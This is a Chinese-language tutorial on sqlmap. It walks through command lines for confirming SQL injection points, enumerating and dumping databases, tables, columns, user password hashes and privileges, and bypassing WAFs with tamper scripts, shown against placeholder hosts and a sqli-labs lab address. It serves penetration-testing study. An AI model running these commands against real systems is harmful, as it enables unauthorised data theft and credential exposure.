# 一、目标

## 1、指定url -u

`-u` 参数，指定需要检测的url，单/双引号包裹。中间如果有提示，就输入y。

提示：SQLmap不能直接「扫描」网站漏洞，先用其他扫描工具扫出注入点，再用SQLmap验证并「利用」注入点。

```shell
sqlmap -u 'url'
```

## 2、指定文件（批量检测）

准备一个「文件」，写上需要检测的多个url，一行一个。

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/8cf3f6fe34fdf02ee2474dffd150824a.png)

`-m` 指定文件，可以「批量扫描」文件中的url。

```shell
sqlmap -m urls.txt
```

## 3、指定数据库/表/字段

`-D ` 指定目标「数据库」，单/双引号包裹，常配合其他参数使用。

`-T `指定目标「表」，单/双引号包裹，常配合其他参数使用。

`-C `指定目标「字段」，单/双引号包裹，常配合其他参数使用。

```shell
sqlmap -u 'http://xx/?id=1' -D 'security' -T 'users' -C 'username' --dump
```

## 4、post请求

检测「post请求」的注入点，使用BP等工具「抓包」，将http请求内容保存到txt文件中。

`-r` 指定需要检测的文件，SQLmap会通过post请求方式检测目标。

```shell
sqlmap -r bp_request.txt
```

## 5、cookie注入

`--cookie` 指定cookie的值，单/双引号包裹。

```shell
sqlmap -u "http://xx" --cookie 'cookie'
```

# 二、脱库

## 1、获取数据库

`--dbs` 获取数据库

#### 1.1`-b`获取数据库版本banner

```
sqlmap -u 'http://xx/?id=1' -b
```

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-16-15-26-34-image.png)

#### 1.2、获取当前使用的数据库

```
--current-db
```

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-16-15-29-49-image.png)

#### 1.3、获取所有数据库

```
sqlmap -u 'http://xx/?id=1' --dbs
```

## 2、获取表

`--tables` 获取表

**2.1、获取表，可以指定数据库**

```
sqlmap -u 'http://xx/?id=1' -D 'security' --tables
```

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-16-15-31-07-image.png)

**2.2、同时获取多个数据库的表名，库名用逗号分隔。**

```
sqlmap -u 'http://xx/?id=1' -D 'security,sys' --tables
```

**2.3、不指定数据库，默认获取数据库中所有的表。**

```
sqlmap -u 'http://xx/?id=1' --tables
```

## 3、获取字段

`--columns` 参数用来获取字段。

**3.1、获取字段，可以指定库和表**

提示：只指定库名但不指定表名会报错。

```
sqlmap -u 'http://xx/?id=1' -D 'security' -T 'users' --columns
```

**3.2、不指定表名，默认获取当前数据库中所有表的字段。**

```
sqlmap -u 'http://xx/?id=1' --columns
```

## 4、获取字段类型

`--schema` 获取字段类型，可以指定库或指定表。不指定则获取数据库中所有字段的类型。

```
sqlmap -u 'http://xx/?id=1' -D 'security' --schema
```

<img title="" src="file:///C:/Users/戴建/AppData/Roaming/marktext/images/2026-03-16-15-42-40-image.png" alt="" width="299">

## 5、获取值（数据）

`--dump` 获取值，也就是表中的数据。可以指定具体的库、表、字段。

```
sqlmap -u 'http://xx/?id=1' -D 'security' -T 'users' -C 'id,username,password' --dump
```

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-16-15-46-00-image.png)

默认来说获取表中的所有数据，可以使用 `--start` `--stop` 指定开始和结束的行，只获取一部分数据。

```
sqlmap -u 'http://xx/?id=1' -D 'security' -T 'users' --start 1 --stop 5  --dump
```

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-16-15-45-02-image.png)

#### 6、获取用户

**6.1、获取当前登录数据库的用户**

```
sqlmap -u 'http://192.168.31.180/sqli-labs-master/Less-1/?id=1' --current-user
```

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-16-15-46-59-image.png)

**6.2、获取所有用户**

`--users` 获取数据库的所有用户名。

```
sqlmap -u 'http://xx/?id=1' --users
```

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-16-15-47-38-image.png)

**6.3、获取用户密码**

`--passwords` 获取所有数据库用户的密码（哈希值）。

数据库不 存储 明文密码，只会将密码加密后，存储密码的哈希值，所以这里只能查出来哈希值；当然，你也可以借助工具把它们解析成明文。

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-16-15-48-50-image.png)

**6.4、获取用户权限**

`--privileges` 查看每个数据库用户都有哪些权限。

```
sqlmap -u 'http://192.168.31.180/sqli-labs-master/Less-1/?id=1' --privileges
```

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-16-16-41-51-image.png)

**6.5、判断当前用户是不是管理员**

`--is-dba` 判断当前登录的用户是不是数据库的管理员账号。

```
sqlmap -u 'http://xx/?id=1' --is-dba
```

如果是管理员，就在最后面显示 true。

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-16-16-45-32-image.png)

## 7、获取主机名

`--hostname` 获取 服务器 主机名。

```
sqlmap -u 'http://xx/?id=1' --hostname
```

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-16-16-46-03-image.png)

## 8、搜索库、表、字段。

`--search` 搜索数据库中是否存在指定库/表/字段，需要指定库名/表名/字段名。

搜索数据库中有没有 security 这个数据库：

```
sqlmap -u 'http://xx/?id=1' -D 'security' --search
```

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-16-16-46-58-image.png)

需要手动选择模糊匹配（1）还是完全匹配（2），而后返回匹配的结果

也可以搜索表

```
sqlmap -u 'http://xxx/?id=1' -T 'users' --search
```

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-16-16-48-09-image.png)

或者搜索字段

```
sqlmap -u 'http://xx/?id=1' -C 'username' --search
```

## 9、正在执行的SQL语句

`--statements` 获取数据库中正在执行的SQL语句。

```
sqlmap -u 'http://xx/?id=1' --statements
```

 ![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-16-16-50-45-image.png)

# 三、WAF绕过

--tamper 指定绕过脚本，绕过WAF或ids等。

sqlmap -u 'http://xx/?id=1' --tamper 'space2comment.py'

    1
    2
    3

在这里插入图片描述

SQLmap内置了很多绕过脚本，在 /usr/share/sqlmap/tamper/ 目录下：

在这里插入图片描述

脚本按照用途命名，比如 space2comment.py 是指，用/**/代替空格。

当然，你也可以根据内置脚本格式，自己定义绕过脚本。

# 四、其他

`--batch`       （默认确认）不再询问是否确认。

`--method=GET` 指定请求方式（ GET /POST）

`--random-agent` 随机切换UA（User-Agent）

`--user-agent 'self_UA'` 使用自定义的UA（User-Agent）

`--referer ' '` 使用自定义的 referer

`--proxy="127.0.0.1:8080"` 指定代理

`--threads 10` 设置线程数，最高10

`--level=1` 执行测试的等级（1-5，默认为1，常用3）

`--risk=1` 风险级别（0~3，默认1，常用1），级别提高会增加数据被篡改的风险。
